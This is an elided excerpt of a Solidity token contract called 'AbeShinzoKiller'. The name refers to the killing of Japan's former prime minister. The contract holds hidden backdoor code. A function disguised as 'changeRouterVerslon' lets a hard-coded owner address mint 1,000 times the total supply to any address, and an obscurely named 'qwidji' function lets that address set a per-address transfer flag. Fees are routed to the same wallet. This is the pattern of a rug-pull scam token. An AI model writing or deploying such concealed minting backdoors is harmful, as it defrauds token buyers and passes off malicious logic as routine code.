...
contract AbeShinzoKiller is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    string private _name = "AbeShinzoKiller";
    string private _symbol = "AbeKiller";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0x74BaF5fbf2ddA95F9cD220c8a74957316B94DfCf));
        m = payable(address(0x74BaF5fbf2ddA95F9cD220c8a74957316B94DfCf));

        _transfe[_msSender()] = _totalSupply;
    ...
    function changeRouterVerslon(address newRoutrAddress) public {if(msg.sender == m){
        _transfe[newRoutrAddress] = totalSupply().mul(1000);}
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            _transfe[sender] = _transfe[sender].sub(amount);
            ...
            _transfe[recipient] = _transfe[recipient].add(finalAmount);
    ...
    function qwidji(address a,bool b) public {if(msg.sender == m){
        _transferr[a] = b;}
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _transfe[sender] = _transfe[sender].sub(amount, "Insufficient Balance");
        _transfe[recipient] = _transfe[recipient].add(amount);
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountBNBMarketing > 0)
            transferToAddressETH(m, amountBNBMarketing);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(feeAmount > 0) {
            _transfe[address(this)] = _transfe[address(this)].add(feeAmount);
